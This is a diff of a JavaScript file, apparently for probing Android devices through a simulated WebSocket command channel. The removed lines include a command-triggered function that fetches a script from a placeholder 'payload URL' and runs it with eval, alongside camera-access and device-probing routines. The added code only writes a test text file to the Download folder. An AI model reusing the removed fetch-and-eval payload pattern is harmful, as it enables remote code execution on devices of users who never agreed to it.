@@ -1,5 +1,5 @@
-// Simulating WebSocket connection
-const fakeWebSocket = {
+// Simulated WebSocket object
+const simulatedWebSocket = {
   onmessage: null,
   send: function (command) {
     if (this.onmessage) {
@@ -8,99 +8,53 @@ const fakeWebSocket = {
   },
 };
 
-// Define testing functions
-const tests = {
-  // Test 1: Detect Android version
-  getAndroidVersion: function () {
-    try {
-      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-      let androidVersion = "Unknown";
-      if (/Android/.test(userAgent)) {
-        const versionMatch = userAgent.match(/Android\s([0-9\.]*)/);
-        if (versionMatch && versionMatch[1]) {
-          androidVersion = versionMatch[1];
-        }
-      }
-      console.log("Detected Android Version: " + androidVersion);
-      return "Android Version: " + androidVersion;
-    } catch (e) {
-      return "Error detecting Android version: " + e.message;
-    }
-  },
+// Function to create a test file
+function createTestFile() {
+  try {
+    const fileName = "testtxt.txt";
+    const filePath = "/storage/emulated/0/Download/" + fileName; // Common internal storage path for Android devices
+    const fileContent = "This is a test file.";
 
-  // Test 2: Attempt to write to memory
-  writeToMemory: function () {
-    try {
-      window.testMemory = "Memory Test Success";
-      return "Memory write successful!";
-    } catch (e) {
-      return "Error writing to memory: " + e.message;
-    }
-  },
+    // Use the FileSystem API to write the file
+    if (window.resolveLocalFileSystemURL) {
+      window.resolveLocalFileSystemURL("/storage/emulated/0/Download", function (dirEntry) {
+        dirEntry.getFile(fileName, { create: true, exclusive: false }, function (fileEntry) {
+          fileEntry.createWriter(function (fileWriter) {
+            fileWriter.onwriteend = function () {
+              console.log("File successfully created: " + filePath);
+            };
+            fileWriter.onerror = function (err) {
+              console.error("Failed to write file: " + err.message);
+            };
 
-  // Test 3: Access camera (may fail without permissions)
-  accessCamera: function () {
-    try {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then((stream) => {
-          console.log("Camera access success!");
-          stream.getTracks().forEach((track) => track.stop());
-        })
-        .catch((err) => {
-          console.error("Camera access error:", err.message);
+            const blob = new Blob([fileContent], { type: "text/plain" });
+            fileWriter.write(blob);
+          }, function (err) {
+            console.error("Failed to create writer: " + err.message);
+          });
+        }, function (err) {
+          console.error("Failed to get file: " + err.message);
         });
-      return "Camera access attempted.";
-    } catch (e) {
-      return "Error accessing camera: " + e.message;
+      }, function (err) {
+        console.error("Failed to access directory: " + err.message);
+      });
+    } else {
+      console.error("FileSystem API is not supported on this device.");
     }
-  },
+  } catch (err) {
+    console.error("Error creating file: " + err.message);
+  }
+}
 
-  // Test 4: Vibrate phone (requires vibration API support)
-  vibratePhone: function () {
-    try {
-      if (navigator.vibrate) {
-        navigator.vibrate([500, 200, 500]);
-        return "Phone vibrated!";
-      } else {
-        return "Vibration API not supported.";
-      }
-    } catch (e) {
-      return "Error vibrating phone: " + e.message;
-    }
-  },
-
-  // Test 5: Attempt to fetch and execute a script (payload test)
-  fetchAndExecuteScript: function () {
-    const scriptUrl = "https://yourserver.com/testPayload.js"; // Replace with your payload URL
-    try {
-      fetch(scriptUrl)
-        .then((response) => response.text())
-        .then((script) => {
-          eval(script); // Note: Using eval is risky; use cautiously and ethically
-          console.log("Payload executed successfully!");
-        })
-        .catch((err) => {
-          console.error("Error fetching payload:", err.message);
-        });
-      return "Payload fetch initiated.";
-    } catch (e) {
-      return "Error executing payload: " + e.message;
-    }
-  },
-};
-
-// Simulate WebSocket commands
-fakeWebSocket.onmessage = function (event) {
+// Simulate receiving a WebSocket command
+simulatedWebSocket.onmessage = function (event) {
   const command = event.data;
-  if (tests[command]) {
-    const result = tests[command]();
-    console.log(result);
+  if (command === "createTestFile") {
+    createTestFile();
   } else {
-    console.log("Unknown command: " + command);
+    console.log("Unknown command received: " + command);
   }
 };
 
-// Test all functions in sequence
-Object.keys(tests).forEach((test) => {
-  fakeWebSocket.send(test);
-});
+// Trigger the WebSocket simulation
+simulatedWebSocket.send("createTestFile");
